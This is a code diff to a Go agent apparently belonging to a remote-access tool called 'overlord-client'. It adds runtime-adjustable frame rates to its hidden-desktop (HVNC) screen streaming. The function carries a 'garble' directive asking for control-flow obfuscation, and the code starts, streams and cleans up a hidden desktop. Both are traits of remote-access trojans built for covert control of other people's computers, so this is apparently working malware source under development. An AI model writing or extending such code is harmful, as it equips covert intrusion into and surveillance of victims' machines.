@@ -6,12 +6,14 @@ import (
 	"overlord-client/cmd/agent/capture"
 	rt "overlord-client/cmd/agent/runtime"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
 var (
 	hvncPersistedDisplayValue int
 	hvncPersistedDisplayMu    sync.Mutex
+	hvncTargetFPS             atomic.Int64
 )
 
 func persistHVNCDisplaySelection(display int) {
@@ -28,9 +30,11 @@ func GetPersistedHVNCDisplay() int {
 
 func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
-	interval, fps := streamInterval("OVERLORD_HVNC_MAX_FPS", 120)
+	fps := activeHVNCTargetFPS()
+	interval := time.Second / time.Duration(fps)
 	capture.SetH264TargetFPS(fps)
-	log.Printf("hvnc: starting stream (max fps %d)", fps)
+	capture.SetFrameFlowTargetFPS(fps)
+	log.Printf("hvnc: starting stream (target fps %d)", fps)
 
 	if err := capture.InitializeHVNCDesktop(); err != nil {
 		log.Printf("hvnc: failed to initialize hidden desktop: %v", err)
@@ -47,6 +51,7 @@ func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
 
 	ticker := time.NewTicker(interval)
 	defer ticker.Stop()
+	currentFPS := fps
 	for {
 		select {
 		case <-ctx.Done():
@@ -54,6 +59,14 @@ func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
 			capture.CleanupHVNCDesktop()
 			return nil
 		case <-ticker.C:
+			fps := activeHVNCTargetFPS()
+			if fps != currentFPS {
+				currentFPS = fps
+				capture.SetH264TargetFPS(fps)
+				capture.SetFrameFlowTargetFPS(fps)
+				ticker.Reset(time.Second / time.Duration(fps))
+				log.Printf("hvnc: target fps changed to %d", fps)
+			}
 			if err := capture.NowHVNC(ctx, env); err != nil {
 				if ctx.Err() != nil {
 					log.Printf("hvnc: stopping stream")
@@ -64,6 +77,22 @@ func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
 			}
 		}
 	}
+}
+
+func activeHVNCTargetFPS() int {
+	if fps := int(hvncTargetFPS.Load()); fps > 0 {
+		return fps
+	}
+	_, fps := streamInterval("OVERLORD_HVNC_MAX_FPS", 120)
+	return SetHVNCTargetFPS(fps)
+}
+
+func SetHVNCTargetFPS(fps int) int {
+	fps = clampDesktopTargetFPS(fps)
+	hvncTargetFPS.Store(int64(fps))
+	capture.SetH264TargetFPS(fps)
+	capture.SetFrameFlowTargetFPS(fps)
+	return fps
 }
 
 func HVNCSelect(ctx context.Context, env *rt.Env, display int) error {
